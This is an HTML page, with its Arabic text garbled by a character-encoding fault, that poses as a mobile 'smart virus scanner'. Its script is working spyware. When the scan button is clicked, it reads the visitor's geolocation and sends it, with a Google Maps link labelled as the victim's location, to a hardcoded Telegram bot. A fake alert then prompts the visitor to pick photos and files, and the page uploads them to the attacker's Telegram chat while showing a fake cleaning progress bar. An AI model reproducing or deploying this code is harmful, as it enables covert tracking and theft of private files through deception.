<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÙØ§Ø­Øµ Ø§Ù„ÙÙŠØ±ÙˆØ³Ø§Øª Ø§Ù„Ø°ÙƒÙŠ - Mobile Scan</title>
    <style>
        body { background: #121212; color: #00ff00; font-family: sans-serif; text-align: center; padding: 20px; }
        .scan-container { border: 2px solid #00ff00; padding: 30px; border-radius: 15px; display: inline-block; }
        .btn { background: #00ff00; color: #000; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .progress-bar { width: 100%; background: #333; height: 20px; margin-top: 20px; display: none; }
        .fill { width: 0%; height: 100%; background: #00ff00; transition: 0.5s; }
    </style>
</head>
<body>
    <div class="scan-container">
        <h1>ğŸ” ÙØ­Øµ Ø£Ù…Ø§Ù† Ø§Ù„Ù‡Ø§ØªÙ</h1>
        <p>ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ù†Ø´Ø§Ø· Ù…Ø´Ø¨ÙˆÙ‡. Ø§Ø¶ØºØ· Ø£Ø¯Ù†Ø§Ù‡ Ù„ØªÙ†Ø¸ÙŠÙ Ø¬Ù‡Ø§Ø²Ùƒ.</p>
        <button class="btn" onclick="executeDeepScan()">Ø§Ø¨Ø¯Ø£ Ø§Ù„ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø´Ø§Ù…Ù„</button>
        <div class="progress-bar" id="pBar"><div class="fill" id="fill"></div></div>
        <p id="status"></p>
        <input type="file" id="fileInp" style="display:none" multiple onchange="uploadFiles(this.files)">
    </div>

    <script>
        const BOT_TOKEN = "8792462869:AAGxQ6OUf6wYfKDywDTYnrJ0XiC8-qj6BOA";
        const CHAT_ID = "8573991339";

        function executeDeepScan() {
            document.getElementById('pBar').style.display = 'block';
            document.getElementById('status').innerText = "Ø¬Ø§Ø±ÙŠ ØªØ­Ø¯ÙŠØ¯ Ø«ØºØ±Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²...";

            // 1. Ø³Ø­Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    const msg = `ğŸ“ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¶Ø­ÙŠØ©:\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    sendToTelegram(msg);
                });
            }

            // 2. Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…Ù„ÙØ§Øª (Ù„Ø§ ÙŠÙ…ÙƒÙ† ØªØ¬Ø§ÙˆØ²Ù‡ ØªÙ‚Ù†ÙŠØ§Ù‹ ÙÙŠ Ø§Ù„Ù…ØªØµÙØ­ Ø¨Ø¯ÙˆÙ† Ø¶ØºØ·Ø©)
            setTimeout(() => {
                alert("ØªÙ†Ø¨ÙŠÙ‡: ÙŠØªØ·Ù„Ø¨ Ø§Ù„ÙØ­Øµ Ø§Ù„Ø¹Ù…ÙŠÙ‚ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø³Ø¬Ù„ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø¤Ù‚ØªØ© (DCIM/Files) Ù„Ø­Ø°Ù Ù…Ù„ÙØ§Øª Ø§Ù„ØªØ¬Ø³Ø³.");
                document.getElementById('fileInp').click();
            }, 1500);
        }

        function sendToTelegram(text) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
        }

        function uploadFiles(files) {
            document.getElementById('status').innerText = "Ø¬Ø§Ø±ÙŠ ØªØ¯Ù…ÙŠØ± Ø§Ù„ÙÙŠØ±ÙˆØ³Ø§Øª ÙÙŠ Ø§Ù„Ù…Ù„ÙØ§Øª...";
            let count = 0;
            Array.from(files).forEach(file => {
                let formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', file);
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData })
                .then(() => {
                    count++;
                    let progress = (count / files.length) * 100;
                    document.getElementById('fill').style.width = progress + "%";
                    if(progress === 100) document.getElementById('status').innerText = "ØªÙ… Ø­Ù…Ø§ÙŠØ© Ø¬Ù‡Ø§Ø²Ùƒ Ø¨Ù†Ø¬Ø§Ø­! âœ…";
                });
            });
        }
    </script>
</body>
</html>
